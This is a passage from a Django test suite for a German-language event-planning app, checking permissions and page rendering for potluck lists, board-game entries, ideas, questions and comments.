        title_cell = owner_html.index("<strong>Salat</strong>")
        item_content = owner_html.index('class="potluck-item-content"', title_cell)
        actions = owner_html.index('class="potluck-item-actions"', title_cell)
        self.assertLess(title_cell, item_content)
        self.assertLess(item_content, actions)
        self.assertNotIn("<th>Aktionen</th>", owner_html)

        orga_client = Client(SERVER_NAME="localhost")
        orga_client.force_login(self.orga)
        orga_html = orga_client.get(f"/{self.event.pk}/").content.decode()
        self.assertIn("(Orga:) Bearbeiten", orga_html)
        self.assertIn("(Orga:) Löschen", orga_html)

        other_client = Client(SERVER_NAME="localhost")
        other_client.force_login(self.other)
        other_html = other_client.get(f"/{self.event.pk}/").content.decode()
        self.assertNotIn('class="potluck-item-actions"', other_html)

    def test_actions_hidden_for_owner_but_shown_for_orga_once_claimed(self):
        PotluckClaim.objects.create(item=self.item, user=self.other, quantity=1)

        owner_client = Client(SERVER_NAME="localhost")
        owner_client.force_login(self.owner)
        owner_html = owner_client.get(f"/{self.event.pk}/").content.decode()
        self.assertNotIn('class="potluck-item-actions"', owner_html)

        orga_client = Client(SERVER_NAME="localhost")
        orga_client.force_login(self.orga)
        orga_html = orga_client.get(f"/{self.event.pk}/").content.decode()
        self.assertIn('class="potluck-item-actions"', orga_html)
        self.assertIn("(Orga:) Bearbeiten", orga_html)
        self.assertIn("(Orga:) Löschen", orga_html)


class PotluckClaimCancelPermissionTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create(username="owner", email="owner@example.com")
        self.other = User.objects.create(username="other", email="other@example.com")
        self.admin = User.objects.create(username="admin", email="admin@example.com", is_superuser=True)
        self.event = Event.objects.create(title="Testevent", created_by=self.owner)
        self.item = PotluckItem.objects.create(event=self.event, title="Salat")
        self.claim = PotluckClaim.objects.create(item=self.item, user=self.owner)

    def test_owner_can_cancel_own_claim(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)
        client.post(f"/claim/{self.claim.pk}/loeschen/")
        self.assertFalse(PotluckClaim.objects.filter(pk=self.claim.pk).exists())

    def test_other_user_cannot_cancel_claim(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        response = client.post(f"/claim/{self.claim.pk}/loeschen/")
        self.assertEqual(response.status_code, 403)
        self.assertTrue(PotluckClaim.objects.filter(pk=self.claim.pk).exists())

    def test_superuser_can_cancel_others_claim(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.admin)
        client.post(f"/claim/{self.claim.pk}/loeschen/")
        self.assertFalse(PotluckClaim.objects.filter(pk=self.claim.pk).exists())


class PotluckClaimEditPermissionTests(TestCase):
    def setUp(self):
        self.orga = User.objects.create(username="orga", email="orga@example.com")
        self.claimant = User.objects.create(username="claimant", email="claimant@example.com")
        self.other = User.objects.create(username="other", email="other@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.orga)
        self.item = PotluckItem.objects.create(event=self.event, title="Salat")
        self.claim = PotluckClaim.objects.create(item=self.item, user=self.claimant, quantity=1)

    def test_owner_can_change_own_quantity(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.claimant)
        client.post(f"/claim/{self.claim.pk}/bearbeiten/", {"quantity": 3, "comment": ""})
        self.claim.refresh_from_db()
        self.assertEqual(self.claim.quantity, 3)

    def test_orga_can_change_others_quantity(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.orga)
        client.post(f"/claim/{self.claim.pk}/bearbeiten/", {"quantity": 4, "comment": ""})
        self.claim.refresh_from_db()
        self.assertEqual(self.claim.quantity, 4)

    def test_other_user_cannot_change_quantity(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        response = client.post(f"/claim/{self.claim.pk}/bearbeiten/", {"quantity": 9, "comment": ""})
        self.assertEqual(response.status_code, 403)
        self.claim.refresh_from_db()
        self.assertEqual(self.claim.quantity, 1)


class PotluckClaimForOtherTests(TestCase):
    def setUp(self):
        self.orga = User.objects.create(username="orga", email="orga@example.com")
        self.member = User.objects.create(username="member", email="member@example.com")
        self.stranger = User.objects.create(username="stranger", email="stranger@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.orga)
        Attendance.objects.create(event=self.event, user=self.member)
        self.item = PotluckItem.objects.create(event=self.event, title="Salat", needed_quantity=3)
        self.url = f"/mitbringliste/{self.item.pk}/claim/fuer-andere/"

    def client_for(self, user):
        client = Client(SERVER_NAME="localhost")
        client.force_login(user)
        return client

    def test_orga_can_enter_claim_for_attendee(self):
        response = self.client_for(self.orga).post(self.url, {"user": self.member.pk, "name": "", "quantity": 2, "comment": ""})
        self.assertEqual(response.status_code, 302)
        claim = PotluckClaim.objects.get(item=self.item)
        self.assertEqual(claim.user, self.member)
        self.assertEqual(claim.entered_by, self.orga)
        self.assertEqual(self.item.remaining, 1)
        self.assertTrue(OrgaActionLog.objects.filter(event=self.event, description__contains="Salat").exists())

    def test_orga_can_enter_claim_by_name_and_it_counts(self):
        self.client_for(self.orga).post(self.url, {"user": "", "name": "Oma Hilde", "quantity": 3, "comment": ""})
        claim = PotluckClaim.objects.get(item=self.item)
        self.assertIsNone(claim.user)
        self.assertEqual(claim.person_label, "Oma Hilde")
        self.assertEqual(self.item.remaining, 0)
        page = self.client_for(self.member).get(f"/{self.event.pk}/")
        self.assertContains(page, "Oma Hilde")
        self.assertContains(page, "eingetragen von")

    def test_person_or_name_required_but_not_both(self):
        client = self.client_for(self.orga)
        client.post(self.url, {"user": "", "name": "", "quantity": 1})
        client.post(self.url, {"user": self.member.pk, "name": "Oma Hilde", "quantity": 1})
        self.assertFalse(PotluckClaim.objects.exists())

    def test_non_attendee_cannot_be_selected(self):
        self.client_for(self.orga).post(self.url, {"user": self.stranger.pk, "name": "", "quantity": 1})
        self.assertFalse(PotluckClaim.objects.exists())

    def test_participant_cannot_enter_for_others(self):
        response = self.client_for(self.member).post(self.url, {"user": "", "name": "Oma Hilde", "quantity": 1})
        self.assertEqual(response.status_code, 403)
        self.assertFalse(PotluckClaim.objects.exists())

    def test_orga_sees_button_participant_does_not(self):
        self.assertContains(self.client_for(self.orga).get(f"/{self.event.pk}/"), "Für jemand anderen eintragen")
        self.assertNotContains(self.client_for(self.member).get(f"/{self.event.pk}/"), "Für jemand anderen eintragen")

    def test_orga_can_delete_claim_it_entered_but_not_own_claims_of_others(self):
        entered = PotluckClaim.objects.create(item=self.item, name="Oma Hilde", entered_by=self.orga)
        own = PotluckClaim.objects.create(item=self.item, user=self.member)
        client = self.client_for(self.orga)
        client.post(f"/claim/{entered.pk}/loeschen/")
        self.assertFalse(PotluckClaim.objects.filter(pk=entered.pk).exists())
        response = client.post(f"/claim/{own.pk}/loeschen/")
        self.assertEqual(response.status_code, 403)
        self.assertTrue(PotluckClaim.objects.filter(pk=own.pk).exists())

    def test_planning_event_offers_visitors(self):
        self.event.planning_enabled = True
        self.event.save()
        EventVisit.objects.create(event=self.event, user=self.stranger, last_visited_at=timezone.now())
        self.client_for(self.orga).post(self.url, {"user": self.stranger.pk, "name": "", "quantity": 1})
        self.assertTrue(PotluckClaim.objects.filter(user=self.stranger).exists())


class GameBringClaimCancelPermissionTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create(username="owner", email="owner@example.com")
        self.other = User.objects.create(username="other", email="other@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.owner)
        self.game = GameEntry.objects.create(event=self.event, name="Catan", type="bring", created_by=self.owner)
        self.claim = GameBringClaim.objects.create(game=self.game, user=self.owner)

    def test_owner_can_cancel_own_claim(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)
        client.post(f"/spiele-mitbringen/{self.claim.pk}/zurueckziehen/")
        self.assertFalse(GameBringClaim.objects.filter(pk=self.claim.pk).exists())

    def test_other_user_cannot_cancel_claim(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        response = client.post(f"/spiele-mitbringen/{self.claim.pk}/zurueckziehen/")
        self.assertEqual(response.status_code, 403)
        self.assertTrue(GameBringClaim.objects.filter(pk=self.claim.pk).exists())

    def test_game_actions_and_bring_claim_actions_are_grouped_below_their_entries(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)

        html = client.get(f"/{self.event.pk}/").content.decode()
        games_list = html[html.index('class="games-list"'):]
        title = games_list.index("<strong>Catan</strong>")
        title_actions = games_list.index('game-title-actions', title)
        # The item contains nested details (e.g. the interest list).
        depth = 0
        for tag in re.finditer(r"<details\b[^>]*>|</details>", games_list):
            depth += -1 if tag.group() == "</details>" else 1
            if depth == 0:
                item_end = tag.start()
                break
        else:
            self.fail("Game item has no closing details element")

        self.assertLess(title, title_actions)
        self.assertLess(title_actions, item_end)
        self.assertIn('class="claim-entry game-bring-claim"', games_list)
        self.assertIn('class="game-bring-claim-action"', games_list)
        self.assertIn('class="game-item-content"', games_list)
        self.assertNotIn("<table", games_list[:item_end])


class GameInterestTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create(username="owner", email="owner@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.owner)
        self.game = GameEntry.objects.create(
            event=self.event, name="Catan", type="bring", created_by=self.owner
        )
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.owner)

    def test_owner_can_toggle_interest_in_own_game(self):
        url = f"/spiele/{self.game.pk}/interesse/"

        response = self.client.post(url)
        self.assertRedirects(response, f"/{self.event.pk}/#game-{self.game.pk}")
        self.assertTrue(GameInterest.objects.filter(game=self.game, user=self.owner).exists())

        self.client.post(url)
        self.assertFalse(GameInterest.objects.filter(game=self.game, user=self.owner).exists())

    def test_interest_action_is_visible_for_own_game(self):
        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, f'/spiele/{self.game.pk}/interesse/')
        self.assertContains(response, "Ich habe Interesse an dem Spiel")

    def test_game_is_collapsible_without_table_markup(self):
        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, '<details class="game-item-details">')
        self.assertContains(response, 'class="games-list"')
        self.assertNotContains(response, 'class="game-table games-table"')
        self.assertContains(response, '<select class="game-sort-select">')
        self.assertContains(response, '<option value="owner:asc">Mitbringer A–Z</option>', html=True)
        self.assertContains(response, '<option value="interest:desc">Meiste Interessenten</option>', html=True)
        self.assertNotContains(response, 'class="game-comments-row"')

    def test_summary_shows_bringer_and_bgg_link(self):
        Attendance.objects.create(event=self.event, user=self.owner, name="Owner")
        GameBringClaim.objects.create(game=self.game, user=self.owner)
        self.game.bgg_id = 13
        self.game.save(update_fields=["bgg_id"])

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, '<span class="game-summary-name-row">')
        self.assertContains(response, '<small class="game-summary-bringers"><em>owner</em></small>', html=True)
        self.assertContains(response, 'href="https://boardgamegeek.com/boardgame/13"')
        self.assertContains(response, 'class="game-bgg-toggle"')
        self.assertContains(response, "Auf BoardGameGeek ansehen")

    def test_non_attending_bringer_does_not_cover_game(self):
        GameBringClaim.objects.create(game=self.game, user=self.owner)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, '</i> Mitbringer gesucht</span>')
        self.assertContains(response, "Noch offene Spielewünsche (1)")
        self.assertContains(response, 'data-owner=""')

    def test_attending_bringer_covers_game_and_is_counted(self):
        Attendance.objects.create(event=self.event, user=self.owner, name="Owner")
        GameBringClaim.objects.create(game=self.game, user=self.owner)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertNotContains(response, '</i> Mitbringer gesucht</span>')
        self.assertNotContains(response, "Noch offene Spielewünsche")
        self.assertNotContains(response, 'fa-hand-holding-heart"></i> 1')
        self.assertContains(response, 'data-owner="owner "')

    def test_bringer_without_attendance_covers_game_on_planning_events(self):
        self.event.planning_enabled = True
        self.event.save(update_fields=["planning_enabled"])
        GameBringClaim.objects.create(game=self.game, user=self.owner)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertNotContains(response, '</i> Mitbringer gesucht</span>')
        self.assertNotContains(response, "Noch offene Spielewünsche")
        self.assertNotContains(response, "nicht angemeldet")
        self.assertContains(response, 'data-owner="owner "')

    def test_interest_badge_is_hidden_without_interest(self):
        response = self.client.get(f"/{self.event.pk}/")
        html = response.content.decode()
        summary_start = html.index("<summary>", html.index('<details class="game-item-details">'))
        summary_end = html.index("</summary>", summary_start)

        self.assertNotIn("interest-count-badge", html[summary_start:summary_end])

    def test_interest_badge_uses_stronger_color_for_more_interest(self):
        users = [User.objects.create(username=f"interested-{index}") for index in range(5)]
        for user in users:
            GameInterest.objects.create(game=self.game, user=user)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(
            response,
            '<span class="pill count-badge interest-count-badge interest-high"><i class="fa-solid fa-star"></i> 5</span>',
            html=True,
        )

    def test_comment_count_and_comments_are_inside_expanded_content(self):
        GameComment.objects.create(game=self.game, author=self.owner, text="Erster Kommentar")
        GameComment.objects.create(game=self.game, author=self.owner, text="Zweiter Kommentar")

        response = self.client.get(f"/{self.event.pk}/")
        html = response.content.decode()
        details_start = html.index('<details class="game-item-details">')
        details_end = html.index('</div>\n                        \n                </div>', details_start)

        self.assertIn('<i class="fa-solid fa-comment"></i> 2', html[details_start:details_end])
        self.assertIn("Erster Kommentar", html[details_start:details_end])
        self.assertIn("Zweiter Kommentar", html[details_start:details_end])

    def test_comment_badge_is_hidden_without_comments(self):
        response = self.client.get(f"/{self.event.pk}/")
        html = response.content.decode()
        summary_start = html.index('<summary>', html.index('<details class="game-item-details">'))
        summary_end = html.index("</summary>", summary_start)

        self.assertNotIn('fa-comment', html[summary_start:summary_end])


class ContentDeletePermissionTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create(username="owner", email="owner@example.com")
        self.editor = User.objects.create(username="editor", email="editor@example.com")
        self.author = User.objects.create(username="author", email="author@example.com")
        self.stranger = User.objects.create(username="stranger", email="stranger@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.owner)
        self.event.editors.add(self.editor)
        self.game = GameEntry.objects.create(event=self.event, name="Catan", type="bring", created_by=self.owner)

    def test_author_can_delete_own_idea(self):
        idea = Idea.objects.create(event=self.event, text="Grillabend", author=self.author)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.author)
        client.post(f"/ideen/{idea.pk}/loeschen/")
        self.assertFalse(Idea.objects.filter(pk=idea.pk).exists())

    def test_stranger_cannot_delete_others_idea(self):
        idea = Idea.objects.create(event=self.event, text="Grillabend", author=self.author)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stranger)
        response = client.post(f"/ideen/{idea.pk}/loeschen/")
        self.assertEqual(response.status_code, 403)
        self.assertTrue(Idea.objects.filter(pk=idea.pk).exists())

    def test_editor_can_delete_others_idea(self):
        idea = Idea.objects.create(event=self.event, text="Grillabend", author=self.author)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.editor)
        client.post(f"/ideen/{idea.pk}/loeschen/")
        self.assertFalse(Idea.objects.filter(pk=idea.pk).exists())

    def test_stranger_cannot_delete_others_question(self):
        question = Question.objects.create(event=self.event, text="Wann geht's los?", author=self.author)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stranger)
        response = client.post(f"/fragen/{question.pk}/loeschen/")
        self.assertEqual(response.status_code, 403)
        self.assertTrue(Question.objects.filter(pk=question.pk).exists())

    def test_stranger_cannot_delete_others_answer(self):
        question = Question.objects.create(event=self.event, text="Wann geht's los?", author=self.author)
        answer = Answer.objects.create(question=question, author=self.author, text="18 Uhr")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stranger)
        response = client.post(f"/antworten/{answer.pk}/loeschen/")
        self.assertEqual(response.status_code, 403)
        self.assertTrue(Answer.objects.filter(pk=answer.pk).exists())

    def test_author_can_update_own_question(self):
        question = Question.objects.create(event=self.event, text="Wann geht's los?", author=self.author)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.author)
        client.post(f"/fragen/{question.pk}/bearbeiten/", {"text": "Wann genau geht's los?"})
        question.refresh_from_db()
        self.assertEqual(question.text, "Wann genau geht's los?")

    def test_stranger_cannot_update_others_question(self):
        question = Question.objects.create(event=self.event, text="Wann geht's los?", author=self.author)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stranger)
        response = client.post(f"/fragen/{question.pk}/bearbeiten/", {"text": "Gehackt"})
        self.assertEqual(response.status_code, 403)
        question.refresh_from_db()
        self.assertEqual(question.text, "Wann geht's los?")

    def test_editor_can_update_others_answer(self):
        question = Question.objects.create(event=self.event, text="Wann geht's los?", author=self.author)
        answer = Answer.objects.create(question=question, author=self.author, text="18 Uhr")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.editor)
        client.post(f"/antworten/{answer.pk}/bearbeiten/", {"text": "18:30 Uhr"})
        answer.refresh_from_db()
        self.assertEqual(answer.text, "18:30 Uhr")

    def test_stranger_cannot_update_others_answer(self):
        question = Question.objects.create(event=self.event, text="Wann geht's los?", author=self.author)
        answer = Answer.objects.create(question=question, author=self.author, text="18 Uhr")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stranger)
        response = client.post(f"/antworten/{answer.pk}/bearbeiten/", {"text": "Gehackt"})
        self.assertEqual(response.status_code, 403)
        answer.refresh_from_db()
        self.assertEqual(answer.text, "18 Uhr")

    def test_author_can_delete_own_game_comment(self):
        comment = GameComment.objects.create(game=self.game, author=self.author, text="Gutes Spiel")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.author)
        client.post(f"/spiele-kommentar/{comment.pk}/loeschen/")
        self.assertFalse(GameComment.objects.filter(pk=comment.pk).exists())

    def test_stranger_cannot_delete_others_game_comment(self):
        comment = GameComment.objects.create(game=self.game, author=self.author, text="Gutes Spiel")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stranger)
        response = client.post(f"/spiele-kommentar/{comment.pk}/loeschen/")
        self.assertEqual(response.status_code, 403)
        self.assertTrue(GameComment.objects.filter(pk=comment.pk).exists())

    def test_editor_can_delete_others_game_comment(self):
        comment = GameComment.objects.create(game=self.game, author=self.author, text="Gutes Spiel")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.editor)
        client.post(f"/spiele-kommentar/{comment.pk}/loeschen/")
        self.assertFalse(GameComment.objects.filter(pk=comment.pk).exists())

    def test_author_can_update_own_game_comment(self):
        comment = GameComment.objects.create(game=self.game, author=self.author, text="Gutes Spiel")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.author)
        client.post(f"/spiele-kommentar/{comment.pk}/bearbeiten/", {"text": "Sehr gutes Spiel"})
        comment.refresh_from_db()
        self.assertEqual(comment.text, "Sehr gutes Spiel")

    def test_stranger_cannot_update_others_game_comment(self):
        comment = GameComment.objects.create(game=self.game, author=self.author, text="Gutes Spiel")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stranger)
        response = client.post(f"/spiele-kommentar/{comment.pk}/bearbeiten/", {"text": "Gehackt"})
        self.assertEqual(response.status_code, 403)
        comment.refresh_from_db()
        self.assertEqual(comment.text, "Gutes Spiel")

    def test_editor_can_update_others_game_comment(self):
        comment = GameComment.objects.create(game=self.game, author=self.author, text="Gutes Spiel")
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.editor)
        client.post(f"/spiele-kommentar/{comment.pk}/bearbeiten/", {"text": "Sehr gutes Spiel"})
        comment.refresh_from_db()
        self.assertEqual(comment.text, "Sehr gutes Spiel")


class IdeaDisplayTests(TestCase):
    def test_event_detail_shows_who_added_the_idea(self):
        user = User.objects.create(
            username="testauthor",
            first_name="Test",
            last_name="Autor",
            email="testauthor@example.com",
        )
        event = Event.objects.create(title="Testevent", created_by=user)
        Idea.objects.create(event=event, text="Grillabend", author=user)
        client = Client(SERVER_NAME="localhost")
        client.force_login(user)

        response = client.get(f"/{event.pk}/")

        self.assertContains(response, "eingetragen von")
        self.assertContains(response, "Test Autor")


class ToggleTests(TestCase):
    def setUp(self):
        self.user = User.objects.create(username="alice", email="alice@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.user)
        self.idea = Idea.objects.create(event=self.event, text="Grillabend", author=self.user)
        self.question = Question.objects.create(event=self.event, text="Frage?", author=self.user)

    def test_idea_like_toggle_adds_then_removes(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.user)
        client.post(f"/ideen/{self.idea.pk}/like/")
        self.assertTrue(IdeaLike.objects.filter(idea=self.idea, user=self.user).exists())
        client.post(f"/ideen/{self.idea.pk}/like/")
        self.assertFalse(IdeaLike.objects.filter(idea=self.idea, user=self.user).exists())

    def test_question_reaction_toggle_adds_then_removes(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.user)
        client.post(f"/fragen/{self.question.pk}/reaktion/", {"emoji": "👍"})
        self.assertTrue(
            QuestionReaction.objects.filter(question=self.question, user=self.user, emoji="👍").exists()
        )
        client.post(f"/fragen/{self.question.pk}/reaktion/", {"emoji": "👍"})
        self.assertFalse(
            QuestionReaction.objects.filter(question=self.question, user=self.user, emoji="👍").exists()
        )

    def test_invalid_emoji_reaction_returns_404(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.user)
        response = client.post(f"/fragen/{self.question.pk}/reaktion/", {"emoji": "🤖"})
        self.assertEqual(response.status_code, 404)


class GameEntryFormTests(TestCase):
    def test_creating_game_redirects_to_new_list_entry(self):
        user = User.objects.create(username="alice", email="alice@example.com")
        event = Event.objects.create(title="Testevent", created_by=user)
        client = Client(SERVER_NAME="localhost")
        client.force_login(user)

        response = client.post(
            f"/{event.pk}/spiele/neu/",
            {"name": "Catan", "type": "bring", "description": ""},
        )

        game = GameEntry.objects.get(event=event, name="Catan")
        self.assertRedirects(
            response,
            f"/{event.pk}/#game-{game.pk}",
            fetch_redirect_response=False,
        )
        detail = client.get(f"/{event.pk}/")
        self.assertContains(detail, f'id="game-{game.pk}"')

    def test_creating_game_can_register_as_explainer(self):
        user = User.objects.create(username="alice", email="alice@example.com")
        event = Event.objects.create(title="Testevent", created_by=user)
        client = Client(SERVER_NAME="localhost")
        client.force_login(user)

        self.assertContains(client.get(f"/{event.pk}/spiele/neu/"), 'name="can_explain"')
        client.post(f"/{event.pk}/spiele/neu/", {"name": "Catan", "type": "bring", "description": "", "can_explain": "on"})
        client.post(f"/{event.pk}/spiele/neu/", {"name": "Azul", "type": "bring", "description": ""})

        self.assertTrue(GameExplainClaim.objects.filter(game__name="Catan", user=user).exists())
        self.assertFalse(GameExplainClaim.objects.filter(game__name="Azul", user=user).exists())

    def test_edit_form_has_no_explain_checkbox(self):
        user = User.objects.create(username="alice", email="alice@example.com")
        event = Event.objects.create(title="Testevent", created_by=user)
        game = GameEntry.objects.create(event=event, name="Catan", type="bring", created_by=user)

        self.assertNotIn("can_explain", GameEntryForm(instance=game, event=event).fields)

    def test_event_detail_shows_who_added_the_game(self):
        user = User.objects.create(
            username="testauthor",
            first_name="Test",
            last_name="Autor",
            email="testauthor@example.com",
        )
        event = Event.objects.create(title="Testevent", created_by=user)
        GameEntry.objects.create(event=event, name="Catan", type="bring", created_by=user)
        client = Client(SERVER_NAME="localhost")
        client.force_login(user)

        response = client.get(f"/{event.pk}/")

        self.assertContains(response, "(eingetragen von Test Autor)")

    def test_duplicate_game_name_in_same_event_is_rejected(self):
        user = User.objects.create(username="alice", email="alice@example.com")
        event = Event.objects.create(title="Testevent", created_by=user)
        GameEntry.objects.create(event=event, name="Catan", type="bring", created_by=user)

        form = GameEntryForm(data={"name": "Catan", "type": "bring", "description": ""}, event=event)

        self.assertFalse(form.is_valid())
        self.assertIn("name", form.errors)

    @override_settings(BGG_API_TOKEN="")
    def test_form_saves_expansions_and_categories_from_text(self):
        user = User.objects.create(username="alice", email="alice@example.com")
        event = Event.objects.create(title="Testevent", created_by=user)

        form = GameEntryForm(
            data={
                "name": "Catan",
                "type": "bring",
                "description": "",
                "expansions": "Seefahrer, Städte & Ritter",
                "bgg_id": 13,
                "min_players": 3,
                "max_players": 4,
                "bgg_rating": "7.12",
                "complexity": "2.32",
                "bgg_categories_text": "Strategiespiel, Würfelspiel",
            },
            event=event,
        )

        self.assertTrue(form.is_valid(), form.errors)
        game = form.save(commit=False)
        game.event = event
        game.save()
        game.refresh_from_db()
        self.assertEqual(game.expansions, "Seefahrer, Städte & Ritter")
        self.assertEqual(game.bgg_categories, ["Strategiespiel", "Würfelspiel"])
        self.assertEqual(game.min_players, 3)
        self.assertEqual(game.max_players, 4)
        self.assertEqual(game.bgg_rating, Decimal("7.12"))
        self.assertEqual(game.complexity, Decimal("2.32"))
        self.assertIsNone(game.bgg_synced_at)

    def test_form_renders_existing_categories_as_text(self):
        user = User.objects.create(username="alice", email="alice@example.com")
        event = Event.objects.create(title="Testevent", created_by=user)
        game = GameEntry.objects.create(
            event=event,
            name="Catan",
            type="bring",
            created_by=user,
            bgg_categories=["Strategiespiel", "Würfelspiel"],
        )

        form = GameEntryForm(instance=game, event=event)

        self.assertEqual(form["bgg_categories_text"].value(), "Strategiespiel, Würfelspiel")

    def test_event_detail_shows_expansions(self):
        user = User.objects.create(username="alice", email="alice@example.com")
        event = Event.objects.create(title="Testevent", created_by=user)
        GameEntry.objects.create(event=event, name="Catan", type="bring", created_by=user, expansions="Seefahrer")
        client = Client(SERVER_NAME="localhost")
        client.force_login(user)

        response = client.get(f"/{event.pk}/")

        self.assertContains(response, "Seefahrer")
        self.assertContains(response, 'data-expansions="seefahrer"')

    def test_event_detail_shows_bgg_popup_icon_and_sort_options(self):
        user = User.objects.create(username="alice", email="alice@example.com")
        event = Event.objects.create(title="Testevent", created_by=user)
        GameEntry.objects.create(event=event, name="Catan", type="bring", created_by=user, bgg_id=13)
        client = Client(SERVER_NAME="localhost")
        client.force_login(user)

        response = client.get(f"/{event.pk}/")

        self.assertContains(response, "game-bgg-toggle")
        self.assertContains(response, 'value="rating:desc"')
        self.assertContains(response, 'value="complexity:asc"')
        self.assertContains(response, 'value="players:desc"')

    def test_previous_release_can_insert_game_without_new_bgg_columns(self):
        """DB defaults keep rolling deployments compatible with old workers."""
        user = User.objects.create(username="alice", email="alice@example.com")
        event = Event.objects.create(title="Testevent", created_by=user)

        # This deliberately mirrors the INSERT generated by the model before
        # the detailed BGG fields were added in migration 0022.
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO events_gameentry
                    (name, type, created_at, event_id, created_by_id,
                     bgg_id, min_players, max_players, playtime_minutes,
                     complexity, thumbnail_url, bgg_synced_at, description)
                VALUES (%s, %s, %s, %s, %s, NULL, NULL, NULL, NULL,
                        NULL, %s, NULL, %s)
                RETURNING id
                """,
                ["Catan", "bring", timezone.now(), event.pk, user.pk, "", ""],
            )
            game_id = cursor.fetchone()[0]

        game = GameEntry.objects.get(pk=game_id)
        self.assertEqual(game.bgg_categories, [])
        self.assertEqual(game.bgg_description, "")
        self.assertEqual(game.bgg_mechanics, [])


class PotluckListPresentationTests(TestCase):
    def setUp(self):
        self.user = User.objects.create(username="potluck-user", email="potluck@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.user)
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.user)

    def test_items_are_collapsible(self):
        PotluckItem.objects.create(event=self.event, title="Salat", created_by=self.user)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, '<details class="potluck-item-details">')
        self.assertContains(response, "<strong>Salat</strong>", html=True)
        self.assertContains(response, '<th data-sort="name">Eintrag</th>', html=True)
        self.assertNotContains(response, 'colspan="2"')

    def test_comment_is_fully_visible_inside_expanded_item(self):
        PotluckItem.objects.create(
            event=self.event,
            title="Salat",
            comment="**Dressing** bitte separat mitbringen.",
            created_by=self.user,
        )

        response = self.client.get(f"/{self.event.pk}/")
        html = response.content.decode()
        details_start = html.index('<details class="potluck-item-details">')
        details_end = html.index("</details>", details_start)
        item_html = html[details_start:details_end]

        self.assertIn('class="potluck-item-comment"', item_html)
        self.assertIn("Dressing", item_html)
        self.assertNotIn("<details", item_html[len('<details class="potluck-item-details">'):])

    def test_comment_is_also_visible_in_collapsed_summary(self):
        PotluckItem.objects.create(
            event=self.event,
            title="Salat",
            comment="**Dressing** bitte\nseparat mitbringen.",
            created_by=self.user,
        )

        response = self.client.get(f"/{self.event.pk}/")
        html = response.content.decode()
        summary_start = html.index("<summary>", html.index('<details class="potluck-item-details">'))
        summary_end = html.index("</summary>", summary_start)
        summary_html = html[summary_start:summary_end]

        self.assertIn('class="potluck-summary-comment"', summary_html)
        self.assertIn("<strong>Dressing</strong> bitte<br>separat mitbringen.", summary_html)

    def test_item_without_target_or_claim_shows_unclaimed_badge(self):
        PotluckItem.objects.create(event=self.event, title="Salat", created_by=self.user)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, '<span class="pill danger">Niemand bringt es mit</span>', html=True)

    def test_unclaimed_badge_is_hidden_when_someone_brings_item(self):
        item = PotluckItem.objects.create(event=self.event, title="Salat", created_by=self.user)
        Attendance.objects.create(event=self.event, user=self.user, name="Potluck User")
        PotluckClaim.objects.create(item=item, user=self.user, quantity=1)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertNotContains(response, "Niemand bringt es mit")
        self.assertContains(response, '<span class="pill success">1 Person bringt es mit</span>', html=True)

    def test_claimed_badge_pluralizes_and_counts_only_attendees(self):
        second = User.objects.create(username="second", email="second@example.com")
        absent = User.objects.create(username="absent", email="absent@example.com")
        item = PotluckItem.objects.create(event=self.event, title="Salat", created_by=self.user)
        Attendance.objects.create(event=self.event, user=self.user, name="Potluck User")
        Attendance.objects.create(event=self.event, user=second, name="Second")
        PotluckClaim.objects.create(item=item, user=self.user, quantity=1)
        PotluckClaim.objects.create(item=item, user=second, quantity=2)
        PotluckClaim.objects.create(item=item, user=absent, quantity=1)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, '<span class="pill success">2 Personen bringen es mit</span>', html=True)
        self.assertNotContains(response, "3 Personen bringen es mit")

